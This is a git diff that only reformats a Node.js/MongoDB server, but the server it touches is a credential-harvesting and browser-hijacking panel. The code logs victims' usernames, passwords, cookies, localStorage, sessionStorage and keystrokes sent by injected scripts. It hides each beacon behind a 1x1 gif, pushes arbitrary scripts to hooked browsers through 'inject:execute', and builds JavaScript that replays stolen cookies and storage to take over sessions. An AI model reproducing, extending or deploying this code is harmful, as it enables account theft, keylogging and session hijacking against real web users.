@@ -5,7 +5,7 @@ const fs = require('fs-extra')
 const chalk = require('chalk')
 const path = require('path')
 const request = require('request')
-const {URL} = require('url')
+const { URL } = require('url')
 const atob = require('atob')
 const btoa = require('btoa')
 const reverse = require('reverse-string')
@@ -125,7 +125,9 @@ MongoClient.connect(config.mongodb, (err, client) => {
       return new Promise((resolve, reject) => {
         db.collection('users', (err, users) => {
           if (err) throw err
-          users.findOne({id: user.id}).then(doc => {
+          users.findOne({
+            id: user.id
+          }).then(doc => {
             resolve(doc)
           })
         })
@@ -135,30 +137,31 @@ MongoClient.connect(config.mongodb, (err, client) => {
       return new Promise((resolve, reject) => {
         db.collection('users', (err, users) => {
           if (err) throw err
-          users.findOne({id: user.id}).then(doc => {
+          users.findOne({
+            id: user.id
+          }).then(doc => {
             let ipAddress = getIP(socket.handshake.address)
             if (socket.handshake.headers['x-forwarded-for']) ipAddress = getIP(socket.handshake.headers['x-forwarded-for'].split(',')[0])
             if (doc !== null) {
               // User exists in database
               users.updateOne({
                 id: user.id
-              },
-                {
-                  $set: {
-                    username: user.login,
-                    github: user // Update the GitHub object with latest values
-                  },
-                  $push: {
-                    logins: {
-                      timestamp: new Date(),
-                      ip: ipAddress,
-                      token: token,
-                      login_type: loginMethod
-                    }
+              }, {
+                $set: {
+                  username: user.login,
+                  github: user // Update the GitHub object with latest values
+                },
+                $push: {
+                  logins: {
+                    timestamp: new Date(),
+                    ip: ipAddress,
+                    token: token,
+                    login_type: loginMethod
                   }
-                }).then(() => {
-                  resolve()
-                })
+                }
+              }).then(() => {
+                resolve()
+              })
             } else {
               // User doesn't exist in database
               users.insertOne({
@@ -211,9 +214,9 @@ MongoClient.connect(config.mongodb, (err, client) => {
           db.collection('projects', (err, projects) => {
             if (err) throw err
             projects.find({
-              $or: [
-                {'permissions.owners': user.id}
-              ]
+              $or: [{
+                'permissions.owners': user.id
+              }]
             }).count().then(count => {
               let restriction = 3
               if (dbUser.payment.account_type.toLowerCase() === 'pro') restriction = 35
@@ -227,7 +230,9 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 })
                 return
               }
-              projects.findOne({ name: project }).then(doc => {
+              projects.findOne({
+                name: project
+              }).then(doc => {
                 if (doc == null) {
                   // Project doesn't exist in database
                   projects.insertOne({
@@ -303,12 +308,19 @@ MongoClient.connect(config.mongodb, (err, client) => {
           if (err) throw err
           let projectsWithAccess = []
           projects.find({
-            $or: [
-              {'permissions.owners': user.id},
-              {'permissions.admins': user.id},
-              {'permissions.readonly': user.id}
+            $or: [{
+                'permissions.owners': user.id
+              },
+              {
+                'permissions.admins': user.id
+              },
+              {
+                'permissions.readonly': user.id
+              }
             ]
-          }).sort({name: 1}).forEach(doc => {
+          }).sort({
+            name: 1
+          }).forEach(doc => {
             if (doc !== null) {
               projectsWithAccess.push({
                 name: doc.name,
@@ -331,18 +343,27 @@ MongoClient.connect(config.mongodb, (err, client) => {
         db.collection('projects', (err, projects) => {
           if (err) throw err
           projects.findOne({
-            $or: [
-              {'permissions.owners': user.id},
-              {'permissions.admins': user.id},
-              {'permissions.readonly': user.id}
+            $or: [{
+                'permissions.owners': user.id
+              },
+              {
+                'permissions.admins': user.id
+              },
+              {
+                'permissions.readonly': user.id
+              }
             ],
-            $and: [
-              {'name': name}
-            ]
+            $and: [{
+              'name': name
+            }]
           }).then(doc => {
             if (doc !== null) {
               let myPermissionLevel = 3
-              if (doc.permissions.owners.includes(user.id)) { myPermissionLevel = 1 } else if (doc.permissions.admins.includes(user.id)) { myPermissionLevel = 2 }
+              if (doc.permissions.owners.includes(user.id)) {
+                myPermissionLevel = 1
+              } else if (doc.permissions.admins.includes(user.id)) {
+                myPermissionLevel = 2
+              }
               resolve({
                 doc: doc,
                 myPermissionLevel: myPermissionLevel
@@ -374,10 +395,10 @@ MongoClient.connect(config.mongodb, (err, client) => {
         getToken(data.code).then(token => {
           if (config.debug) {
             console.log(
-            chalk.greenBright('[GitHub] ') +
-            chalk.yellowBright('retrieved token ') +
-            chalk.magentaBright(token)
-          )
+              chalk.greenBright('[GitHub] ') +
+              chalk.yellowBright('retrieved token ') +
+              chalk.magentaBright(token)
+            )
           }
           // Convert the token into a user object
           getUser(token).then(user => {
@@ -525,7 +546,10 @@ MongoClient.connect(config.mongodb, (err, client) => {
     })
 
     socket.on('project:read', data => {
-      let { project, page } = data
+      let {
+        project,
+        page
+      } = data
       let pages = ['overview', 'passwords', 'keylogger', 'inject', 'config']
 
       if (globalToken) {
@@ -538,7 +562,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
              * Fetch the user from the database
              */
             database(user).then(dbUser => {
-              (function check () {
+              (function check() {
                 /**
                  * Make sure they are still on the same page and same project
                  */
@@ -710,12 +734,11 @@ MongoClient.connect(config.mongodb, (err, client) => {
               if (err) throw err
               projects.updateOne({
                 name: targetProject.doc.name
-              },
-                {
-                  $push: {
-                    ['permissions.' + choosenPermissionLevel]: targetUser
-                  }
-                })
+              }, {
+                $push: {
+                  ['permissions.' + choosenPermissionLevel]: targetUser
+                }
+              })
             })
             resolve({
               title: 'Added user to project',
@@ -743,12 +766,11 @@ MongoClient.connect(config.mongodb, (err, client) => {
               if (err) throw err
               projects.updateOne({
                 name: targetProject.doc.name
-              },
-                {
-                  $pull: {
-                    [theirPermissionName]: targetUser
-                  }
-                })
+              }, {
+                $pull: {
+                  [theirPermissionName]: targetUser
+                }
+              })
             })
             resolve({
               title: 'Removed user',
@@ -767,16 +789,17 @@ MongoClient.connect(config.mongodb, (err, client) => {
           if (targetProject.doc.permissions.owners.includes(requestingUser.id)) {
             db.collection('projects', (err, projects) => {
               if (err) throw err
-              projects.findOne({name: newName}).then(doc => {
+              projects.findOne({
+                name: newName
+              }).then(doc => {
                 if (doc == null) {
                   projects.updateOne({
                     name: targetProject.doc.name
-                  },
-                    {
-                      $set: {
-                        name: newName
-                      }
-                    })
+                  }, {
+                    $set: {
+                      name: newName
+                    }
+                  })
                   resolve({
                     title: 'Renamed project',
                     message: 'Successfully renamed project to ' + newName
@@ -802,16 +825,17 @@ MongoClient.connect(config.mongodb, (err, client) => {
           if (targetProject.doc.permissions.owners.includes(requestingUser.id) || targetProject.doc.permissions.admins.includes(requestingUser.id)) {
             db.collection('projects', (err, projects) => {
               if (err) throw err
-              projects.findOne({name: targetProject.doc.name}).then(doc => {
+              projects.findOne({
+                name: targetProject.doc.name
+              }).then(doc => {
                 if (doc !== null) {
                   projects.updateOne({
                     name: targetProject.doc.name
-                  },
-                    {
-                      $set: {
-                        'config.filter': newFilters
-                      }
-                    })
+                  }, {
+                    $set: {
+                      'config.filter': newFilters
+                    }
+                  })
                   resolve({
                     title: 'Updated domain filters',
                     message: 'Successfully updated filters for ' + targetProject.doc.name
@@ -981,7 +1005,9 @@ MongoClient.connect(config.mongodb, (err, client) => {
     })
 
     socket.on('inject:clients', data => {
-      let { project } = data
+      let {
+        project
+      } = data
       if (project && globalToken) {
         getUser(globalToken).then(user => {
           getProject(project, user).then(thisProject => {
@@ -1031,7 +1057,13 @@ MongoClient.connect(config.mongodb, (err, client) => {
     })
 
     socket.on('inject:execute', data => {
-      let { project, token, id, script, recursive } = data
+      let {
+        project,
+        token,
+        id,
+        script,
+        recursive
+      } = data
       if (project && (recursive || (token && id)) && script && globalToken) {
         getUser(globalToken).then(user => {
           getProject(project, user).then(thisProject => {
@@ -1130,9 +1162,13 @@ MongoClient.connect(config.mongodb, (err, client) => {
       }))
     }
     let authenticate = (req, res, token) => {
-      let { id } = req.query
+      let {
+        id
+      } = req.query
       try {
-        let { ip } = JSON.parse(atob(token))
+        let {
+          ip
+        } = JSON.parse(atob(token))
         if (ip) {
           /**
            * Correctly parsed token
@@ -1268,7 +1304,9 @@ MongoClient.connect(config.mongodb, (err, client) => {
         if (record[project]) {
           db.collection('projects', (err, projects) => {
             if (err) throw err
-            projects.findOne({name: record[project]}).then(doc => {
+            projects.findOne({
+              name: record[project]
+            }).then(doc => {
               if (doc !== null) {
                 if (req.header('Referer') && doc.config.filter.domains.length > 0) {
                   let referer = new URL(req.header('Referer'))
@@ -1336,45 +1374,44 @@ MongoClient.connect(config.mongodb, (err, client) => {
                     }
                     projects.updateOne({
                       name: record[project]
-                    },
-                      {
-                        $push: {
-                          passwords: {
-                            timestamp: new Date(),
-                            username: record[username],
-                            password: record[password],
-                            url: {
-                              title: record[title],
-                              href: record[url]
-                            },
-                            ip: ip,
-                            browser: {
-                              width: record[width],
-                              height: record[height],
-                              'user-agent': parseAgent(headers['user-agent']),
-                              headers: me(headers)
-                            },
-                            storage: {
-                              local: me(record[localStorage]),
-                              session: me(record[sessionStorage]),
-                              cookies: me(c)
-                            }
+                    }, {
+                      $push: {
+                        passwords: {
+                          timestamp: new Date(),
+                          username: record[username],
+                          password: record[password],
+                          url: {
+                            title: record[title],
+                            href: record[url]
+                          },
+                          ip: ip,
+                          browser: {
+                            width: record[width],
+                            height: record[height],
+                            'user-agent': parseAgent(headers['user-agent']),
+                            headers: me(headers)
+                          },
+                          storage: {
+                            local: me(record[localStorage]),
+                            session: me(record[sessionStorage]),
+                            cookies: me(c)
                           }
                         }
-                      }).then(() => {
-                        if (config.debug) {
-                          console.log(
-                        chalk.greenBright('[Record] ') +
-                        chalk.yellowBright('recorded login ') +
-                        chalk.magentaBright(record[username]) +
-                        chalk.yellowBright(':') +
-                        chalk.magentaBright(record[password]) +
-                        chalk.yellowBright(' for project ') +
-                        chalk.cyanBright(record[project])
-                      )
-                        }
-                        resolve('wrote record to database')
-                      })
+                      }
+                    }).then(() => {
+                      if (config.debug) {
+                        console.log(
+                          chalk.greenBright('[Record] ') +
+                          chalk.yellowBright('recorded login ') +
+                          chalk.magentaBright(record[username]) +
+                          chalk.yellowBright(':') +
+                          chalk.magentaBright(record[password]) +
+                          chalk.yellowBright(' for project ') +
+                          chalk.cyanBright(record[project])
+                        )
+                      }
+                      resolve('wrote record to database')
+                    })
                   } else if (record[type] === 1) {
                     // Keylogger
                     let timestamp = new Date()
@@ -1408,40 +1445,38 @@ MongoClient.connect(config.mongodb, (err, client) => {
                       projects.updateOne({
                         'name': record[project],
                         'keylogger.timestamp': timestamp
-                      },
-                        {
-                          $pushAll: {
-                            'keylogger.$.keys': keystrokes
-                          }
-                        }).then((e) => {
-                          if (e.result.nModified === 0) {
+                      }, {
+                        $pushAll: {
+                          'keylogger.$.keys': keystrokes
+                        }
+                      }).then((e) => {
+                        if (e.result.nModified === 0) {
                           // Add new keylogger record
-                            projects.updateOne({
-                              name: record[project]
-                            },
-                              {
-                                $push: {
-                                  keylogger: {
-                                    timestamp: timestamp,
-                                    ip: ip,
-                                    url: {
-                                      title: record[title],
-                                      href: record[url]
-                                    },
-                                    browser: {
-                                      headers: me(headers),
-                                      'user-agent': parseAgent(headers['user-agent'])
-                                    },
-                                    keys: keystrokes
-                                  }
-                                }
-                              }).then(() => {
-                                resolve('wrote record to database')
-                              })
-                          } else {
-                            resolve('wrote log to database')
-                          }
-                        })
+                          projects.updateOne({
+                            name: record[project]
+                          }, {
+                            $push: {
+                              keylogger: {
+                                timestamp: timestamp,
+                                ip: ip,
+                                url: {
+                                  title: record[title],
+                                  href: record[url]
+                                },
+                                browser: {
+                                  headers: me(headers),
+                                  'user-agent': parseAgent(headers['user-agent'])
+                                },
+                                keys: keystrokes
+                              }
+                            }
+                          }).then(() => {
+                            resolve('wrote record to database')
+                          })
+                        } else {
+                          resolve('wrote log to database')
+                        }
+                      })
                     } else {
                       reject('keylogger value(s) not specified')
                     }
@@ -1462,7 +1497,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
       // CORS bypass option enabled
       path = req.path.substring(1).split(/\/(.+)?/, 2)[1].slice(0, -1)
       res.set('Content-Type', 'text/html')
-      .send('<script>window.history.back()</script>')
+        .send('<script>window.history.back()</script>')
     } else {
       path = req.path.substring(1).split(/\/(.+)?/, 2)[1]
       // Send a 1x1px gif
@@ -1472,25 +1507,25 @@ MongoClient.connect(config.mongodb, (err, client) => {
         0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b
       ]
       res
-      .set('Content-Type', 'image/gif')
-      .set('Content-Length', data.length)
-      .status(200)
-      .send(Buffer.from(data))
+        .set('Content-Type', 'image/gif')
+        .set('Content-Length', data.length)
+        .status(200)
+        .send(Buffer.from(data))
     }
     validate(path).then(record => {
       Record(record).then(message => {
         if (config.debug) {
           console.log(
-          chalk.greenBright('[record] ') +
-          chalk.yellowBright(message)
-        )
+            chalk.greenBright('[record] ') +
+            chalk.yellowBright(message)
+          )
         }
       }).catch(error => {
         if (config.debug) {
           console.log(
-          chalk.redBright('[record] ') +
-          chalk.yellowBright(error)
-        )
+            chalk.redBright('[record] ') +
+            chalk.yellowBright(error)
+          )
         }
       })
     }).catch(error => {
@@ -1525,14 +1560,19 @@ MongoClient.connect(config.mongodb, (err, client) => {
             db.collection('projects', (err, projects) => {
               if (err) throw err
               projects.findOne({
-                $or: [
-                  {'permissions.owners': user.id},
-                  {'permissions.admins': user.id},
-                  {'permissions.readonly': user.id}
+                $or: [{
+                    'permissions.owners': user.id
+                  },
+                  {
+                    'permissions.admins': user.id
+                  },
+                  {
+                    'permissions.readonly': user.id
+                  }
                 ],
-                $and: [
-                  {'name': name}
-                ]
+                $and: [{
+                  'name': name
+                }]
               }).then(doc => {
                 if (doc !== null) {
                   let record = doc.passwords[index]
@@ -1547,7 +1587,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                         for (property in local) {
                           if (local.hasOwnProperty(property)) {
                             js +=
-                            `localStorage.setItem('` + property.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `', '` + local[property].replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `');\n`
+                              `localStorage.setItem('` + property.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `', '` + local[property].replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `');\n`
                           }
                         }
                       }
@@ -1555,7 +1595,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                         for (property in session) {
                           if (session.hasOwnProperty(property)) {
                             js +=
-                            `sessionStorage.setItem('` + property.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `', '` + session[property].replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `');\n`
+                              `sessionStorage.setItem('` + property.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `', '` + session[property].replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `');\n`
                           }
                         }
                       }
@@ -1563,7 +1603,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                         for (property in cookies) {
                           if (cookies.hasOwnProperty(property)) {
                             js +=
-                            `document.cookie = '` + property.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `=` + cookies[property].replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `';\n`
+                              `document.cookie = '` + property.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `=` + cookies[property].replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `';\n`
                           }
                         }
                       }
@@ -1699,14 +1739,19 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 })
               } else {
                 projects.findOne({
-                  $or: [
-                    {'permissions.owners': user.id},
-                    {'permissions.admins': user.id},
-                    {'permissions.readonly': user.id}
+                  $or: [{
+                      'permissions.owners': user.id
+                    },
+                    {
+                      'permissions.admins': user.id
+                    },
+                    {
+                      'permissions.readonly': user.id
+                    }
                   ],
-                  $and: [
-                    {'name': name}
-                  ]
+                  $and: [{
+                    'name': name
+                  }]
                 }).then(doc => {
                   if (doc !== null) {
                     resolve({
